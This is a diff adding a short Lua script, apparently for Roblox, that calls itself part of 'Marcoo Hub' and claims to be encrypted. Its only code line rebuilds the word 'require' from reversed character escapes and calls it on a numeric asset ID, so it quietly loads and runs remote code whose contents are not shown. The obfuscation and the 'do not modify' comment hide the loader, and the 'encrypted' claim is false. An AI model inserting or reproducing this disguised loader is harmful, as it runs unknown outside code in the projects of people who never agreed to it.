@@ -1,0 +1,6 @@
+--[==[
+    This script is encrypted and should not be modified.
+    It is a part of the Marcoo Hub.
+]==]
+
+getfenv()[(string.reverse("\101\114\105\117\113\101\114"))]({951151621})
